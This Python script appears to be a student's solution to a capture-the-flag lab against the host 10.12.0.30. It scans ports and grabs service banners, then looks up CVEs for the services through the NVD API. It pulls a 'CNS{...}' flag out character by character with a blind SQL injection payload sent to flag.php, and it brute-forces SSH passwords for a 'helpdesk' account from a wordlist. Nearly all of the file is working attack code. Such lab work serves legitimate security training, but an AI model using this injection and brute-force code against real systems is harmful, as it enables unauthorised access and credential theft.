import socket
import requests
import string
import paramiko
import time

def portScanner():
    while True:
        target = '10.12.0.30'
        try:
            socket.inet_aton(target)
            ports = [21, 22, 23, 25, 80]
            versionDict = {}
            for port in ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    result = sock.connect((target,port))
                    print("Port {}:{} is OPEN".format(target,port))
                    sock.close()
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    result = sock.connect_ex((target,port))
                    if result == 0:
                        if port == 80:
                            sock.close()
                            sock = socket.socket()
                            sock.connect((target,port))
                            sock.sendall(b"GET / HTTP/1.0\r\nHost: 10.12.0.30\r\n\r\n")
                            result = str(sock.recv(256)).split("Date")
                            version = result[0]
                            versionDict[port] = version[version.find("Server")+8:-4]
                        else:
                            if port == 21:
                                result = str(sock.recv(256))[7:-6]
                                versionDict[port] = result
                            if port == 22:
                                result = str(sock.recv(256))[2:-5]
                                versionDict[port] = result
                except:
                    print("Port {}:{} is CLOSED".format(target,port))
                    continue
        except:
            print("Unknown Error...")
            exit()
        for each in versionDict:
            print("Target has port {} running {}...".format(each, versionDict[each]))
        return(versionDict)

def cveFinder(versionDict):
    vsftpdUrl = 'https://services.nvd.nist.gov/rest/json/cves/1.0?cpeMatchString=cpe:/a:vsftpd_project:vsftpd'
    r = requests.get(vsftpdUrl)
    stuff = str(r.content).split("ID")[1][3:16]
    print("{} has CVE/s {}...".format(versionDict[21], stuff))

    nginxUrl = 'https://services.nvd.nist.gov/rest/json/cves/1.0?cpeMatchString=cpe:2.3:a:nginx:nginx:1.13.12'
    r = requests.get(nginxUrl)
    stuff = str(r.content).split("ID")[1][3:16]
    print("{} has CVE/s {}...".format(versionDict[80], stuff))

    sshUrl = 'https://services.nvd.nist.gov/rest/json/cves/1.0?cpeMatchString=cpe:2.3:a:openbsd:openssh:7.5'
    r = requests.get(sshUrl)

    stuff = str(r.content).split("ID")[1][3:16]
    stuff1 = str(r.content).split("ID")[3][3:16]
    stuff2 = str(r.content).split("ID")[4][3:16]
    print("{} has CVE/s {}, {}, and {}...".format(versionDict[22], stuff, stuff1, stuff2))

def webOffensive():

    characters = list(string.ascii_lowercase+ string.ascii_uppercase+string.digits+'{'+'}')
    url = 'http://10.12.0.30/flag.php'
    passwd = ''
    while True:
        for char in characters:
            data = {'flag': "'OR value LIKE BINARY '{}%'#'".format(passwd+char)}
            r = requests.post(url, data=data)
            if 'exists' in r.text:
                passwd = passwd+char
                if passwd[-1] == '}':
                    print('The flag is: {}'.format(passwd))
                    return

def webOffensiveIndexPHP():
    url = 'http://10.12.0.30/index.php'
    r = requests.get(url)
    raw = str(r.content)
    lines = raw.split(".")
    for line in lines:
        if line.find("CNS{") != -1:
            if len(line[line.find("CNS{"):line.find("}")+1]) == 37:
                print(line[line.find("CNS{"):line.find("}")+1])
                return(line[line.find("CNS{"):line.find("}")+1])


def bruteForce():
    user = 'helpdesk'
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    with open(b'C:\Users\student\Downloads\passwords.txt', 'r') as f:
        for each in f:
            line = each.strip()
            try:
                client.connect(hostname='10.12.0.30', username=user, password=line, timeout=3)
            except socket.timeout:
                print("Unreachable")
            except paramiko.AuthenticationException:
                print("Wrong Creds")
            except paramiko.SSHException:
                print("Exception")
                time.sleep(60)
            else:
                print("Username: {}  Password: {}".format(user,line))
                return

if __name__ == "__main__":
    # These will give you all open ports, services/versions, and vulnerabilities
    #versionDict = portScanner()
    #cveFinder(versionDict)
    #webOffensive()
    #bruteForce()
    webOffensiveIndexPHP()

